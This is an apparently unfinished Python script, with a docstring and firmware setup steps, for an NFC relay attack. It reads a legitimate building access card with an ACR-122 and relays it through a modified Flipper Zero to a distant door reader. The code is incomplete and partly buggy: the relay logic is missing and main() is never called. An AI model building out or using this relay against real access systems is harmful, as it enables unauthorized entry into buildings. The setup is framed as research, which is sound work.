### relay.py
'''
  DISCLAIMER : This program was created for research and educational purposes only with no warranty whatsoever.

  Created by TESSIER Solal -- 09-feb-2026

  Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack between
  a legitimate reader and a legitimate access card to grant access to a building
  without the access card being physically close to the reader using
  an ACR-122 and a FlipperZero with modded firmware by gvinet on GitHub. 
  I have forked the repo to add a few upgrades
  (https://github.com/Panostop/flipperzero-firmware-relay). 


  To set up the Flipper :
    - Plug it into the Raspberry Pi
    - run : 
      - git clone "https://github.com/Panostop/flipperzero-firmware-relay.git" 
      - cd flipperzero-firmware-relay
      - ./fbt
      - ./fbt flash_usb
    - wait for the build and installation to finish on the Flipper (can take a while)

  The ACR122 is not used twice because of restrictions in emulation mode.

  For this program to work, you will need to call it with root privileges because of
  the pyscard module


  This is the physical setup expected :

  [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]


'''


from smartcard.System import readers
from smartcard.CardType import AnyCardType
from smartcard.CardRequest import CardRequest
from smartcard.util import toHexString

from subprocess import * #we will need a shell subprocess to communicate with the Flipper


r=readers() #list pc/sc readers
CARDTYPE = AnyCardType() #cardtype object for when we will look for the Access Card


def getCardInfo():
    """
    Uses the libnfc library to get UID, ATQA and SAK from the card.
    """
    
    # I used files instead of pipes for better understanding ang becauses of issues with pipes
    with open("CardInfo.txt", "w") as CardInfo:
        
        # returns the full card info
        CardInfo = Popen( ["nfc-list"], 
                        stdout=CardInfo,
                        stderr=PIPE,
                        )
        CardInfo.communicate() #wait for the output, it often takes a bit
    
    with open("CardInfo.txt", "r") as CardInfo:
        CardInfoLines = [line.rstrip() for line in CardInfo] #load the file in a list
     
        # filter the output to keep the info we need
        
        del CardInfoLines[0]
        del CardInfoLines[0]
        del CardInfoLines[0]
        del CardInfoLines[0]
        del CardInfoLines[-1]
        print(CardInfoLines)
        # keep only the second half (the actual values after the ': ')
        CardInfoLines = [CardInfoLines[i].split(': ')[1] for i in range(3)]
        print(CardInfoLines)
    
    #return UID, ATQA, SAK
    

def main():
  global r
  
  # Display the list of readers
  
  print("Available PC/SC readers :\n")
  for i in range(len(r)):
    print(f"\t-\t{r[i].name}")
  print("")

  if not len(r) == 1:
    print(f"Need exactly 1 ACR122 to continue, {len(r)} readers potentially available.")
    exit(1)
  
  # Now we want to wait for the presence of a card on the ACR122, since we cannot start emulating without it
  
  cardrequest = CardRequest(timeout=5, cardType=CARDTYPE) #configure the waitforcard() method to accept any cardType for 5s on the ACR122
  cardservice = cardrequest.waitforcard() # launch the waitforcard event

  cardservice.connection.connect()
  
  GET_UID=[0xFF, 0xCA, 0x00, 0x00] # command for the ACR122 to get UID
  UID_LEN=[0x07]
  UID, sw1, sw2 = cardservice.connection.transmit([0x26, 0x26, 0x26, 0x26])
  print(toHexString(UID))
  if sw1 != 0x90 and sw2 != 0x00:
      print(f"Could not retrieve UID. Response codes : {sw1} {sw2}")
      exit(1)
#  for i in range(7):
#      # we take the int, convert it to hex (OxXX), remove the 0x, add a 0 at the beginning (for numbers lower than 0x10), keep only the last 2 digits and set them to uppercase.
#      # this allows us to have a universal hexadecimal format with 2 digits. It may not be exactly optimized but it's what I can do
#      # (e.g.  4->'0x4' ->'4' ->'04' ->'04'
#      #      160->'0xa0'->'a0'->'0a0'->'A0')
#      UID[i]=("0"+ hex(UID[i])[2:])[-2:].upper()
#  print(f"Found tag !\n\tUID : \
#  {UID[0]}\
#  {UID[1]}\
#  {UID[2]}\
#  {UID[3]}\
#  {UID[4]}\
#  {UID[5]}\
#  {UID[6]}")
  






if __name__=='__main__':
  getCardInfo()